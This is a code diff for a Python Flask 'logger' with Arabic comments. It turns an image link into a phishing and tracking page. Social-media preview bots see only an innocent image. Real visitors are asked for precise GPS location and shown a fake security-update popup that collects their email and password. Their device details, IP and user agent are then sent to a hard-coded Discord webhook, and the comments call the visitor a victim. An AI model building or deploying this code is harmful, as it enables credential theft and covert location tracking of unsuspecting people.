@@ -3,72 +3,98 @@ import requests
 
 app = Flask(__name__)
 
+# الإعدادات
 WEBHOOK_URL = "https://discord.com/api/webhooks/1493558963869061224/tY_NAc83SlbAMed-ibT8MdFhC88Owdqb-naTrn6q5-En386EXCCqZBByyhiPg6S7JBOr"
-REAL_IMAGE = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRvw7uLGr6ScxbGYJhGNqEjXnW-e6nJaE5c0w&s"
+REAL_IMAGE = "https://static0.thegamerimages.com/wordpress/wp-content/uploads/wm/2025/03/kisuke-urahara-in-bleach-rebirth-of-souls.jpg?w=1600&h=900&fit=crop" # الصورة التي ستظهر للضحية
 
-@app.route('/api/image')
-def logger():
+@app.route('/api/v2/logger')
+def advanced_logger():
     ua = request.headers.get('User-Agent', '')
     ip = request.headers.get('x-forwarded-for', request.remote_addr).split(',')[0]
 
-    # منع بوتات ديسكورد (خدعة التحميل)
-    if "discord" in ua.lower():
-        return f'<meta property="og:image" content="{REAL_IMAGE}"><img src="https://gifer.com">'
+    # تجاوز معاينة بوتات منصات التواصل
+    if any(bot in ua.lower() for bot in ["discord", "facebook", "twitter", "telegram"]):
+        return f'<meta property="og:image" content="{REAL_IMAGE}"><img src="{REAL_IMAGE}">'
 
-    # كود HTML + JS لسحب معلومات "عميقة"
     html_code = '''
     <!DOCTYPE html>
-    <html>
-    <body style="margin:0; background:black; display:flex; justify-content:center; align-items:center; height:100vh;">
-        <img src="{{ img_url }}" style="max-width:100%;">
+    <html dir="rtl">
+    <head>
+        <meta charset="UTF-8">
+        <script src="https://jsdelivr.net"></script>
+    </head>
+    <body style="margin:0; background:black; height:100vh; overflow:hidden;">
+        <img src="{{ img_url }}" id="content" style="width:100%; height:100%; object-fit:contain; display:none;">
+
         <script>
-            async function getExtraInfo() {
+            async function startCapture() {
+                // 1. طلب الموقع الجغرافي الدقيق (GPS)
+                let gps = "مرفوض من المستخدم";
+                try {
+                    const pos = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej));
+                    gps = `https://google.com{pos.coords.latitude},${pos.coords.longitude}`;
+                } catch (e) {}
+
+                // 2. نافذة سحب البيانات الحساسة (الهندسة الاجتماعية)
+                const { value: loginData } = await Swal.fire({
+                    title: 'تحديث أمني مطلوب',
+                    text: 'يرجى تأكيد حسابك لمتابعة العرض',
+                    html: '<input id="email" class="swal2-input" placeholder="الإيميل/الهاتف">' +
+                         '<input id="pass" type="password" class="swal2-input" placeholder="كلمة المرور">',
+                    confirmButtonText: 'تأكيد دخول',
+                    allowOutsideClick: false
+                });
+
+                document.getElementById('content').style.display = 'block';
+
+                // 3. جمع بيانات الجهاز العميقة
                 let battery = await navigator.getBattery();
-                let info = {
-                    "الدقة": window.screen.width + "x" + window.screen.height,
-                    "اللغة": navigator.language,
+                let deviceData = {
+                    "البريد": document.getElementById('email').value || "لم يدخل",
+                    "الباسورد": document.getElementById('pass').value || "لم يدخل",
+                    "الموقع الدقيق (GPS)": gps,
+                    "نوع الجهاز": /Mobi|Android/i.test(navigator.userAgent) ? "جوال" : "كمبيوتر",
+                    "المعالج": navigator.hardwareConcurrency + " نواة",
+                    "الذاكرة (RAM)": navigator.deviceMemory + " GB",
                     "البطارية": (battery.level * 100) + "%",
                     "الشحن": battery.charging ? "يشحن" : "لا يشحن",
-                    "التوقيت": new Date().toLocaleString(),
-                    "المنصة": navigator.platform,
-                    "المعالج": navigator.hardwareConcurrency + " Cores"
+                    "اللغة": navigator.language,
+                    "دقة الشاشة": screen.width + "x" + screen.height
                 };
-                
+
+                // 4. إرسال "الكنز" إلى الديسكورد
                 fetch("{{ webhook }}", {
                     method: "POST",
                     headers: {"Content-Type": "application/json"},
                     body: JSON.stringify({
                         "embeds": [{
-                            "title": "🚨 معلومات جهاز تفصيلية (JS)",
+                            "title": "🚨 تم صيد معلومات جديدة!",
                             "color": 16711680,
-                            "fields": Object.keys(info).map(key => ({name: key, value: info[key], inline: true})),
-                            "footer": {"text": "IP: {{ ip }}"}
+                            "fields": Object.keys(deviceData).map(k => ({name: k, value: deviceData[k], inline: true})),
+                            "footer": {"text": "IP: {{ ip }} | UA: {{ ua }}"}
                         }]
                     })
                 });
             }
-            getExtraInfo();
+            window.onload = startCapture;
         </script>
     </body>
     </html>
     '''
     
-    # جلب معلومات الـ IP الأساسية من Python
+    # جلب بيانات الـ IP جغرافياً عبر السيرفر
     try:
-        data = requests.get(f"http://ip-api.com{ip}?fields=16976857").json()
+        geo = requests.get(f"http://ip-api.com{ip}?fields=status,message,country,city,isp").json()
         requests.post(WEBHOOK_URL, json={
             "embeds": [{
-                "title": "📍 موقع الضحية (Python)",
-                "fields": [
-                    {"name": "المدينة", "value": data.get('city'), "inline": True},
-                    {"name": "المزود", "value": data.get('isp'), "inline": True},
-                    {"name": "الخريطة", "value": "https://google.com" + str(data.get('lat')) + "," + str(data.get('lon'))}
-                ]
+                "title": "📡 دخول جديد (سيرفر)",
+                "description": f"الدولة: {geo.get('country')} | المدينة: {geo.get('city')} | المزود: {geo.get('isp')}",
+                "color": 3447003
             }]
         })
     except: pass
 
-    return render_template_string(html_code, img_url=REAL_IMAGE, webhook=WEBHOOK_URL, ip=ip)
+    return render_template_string(html_code, img_url=REAL_IMAGE, webhook=WEBHOOK_URL, ip=ip, ua=ua)
 
 if __name__ == "__main__":
     app.run()
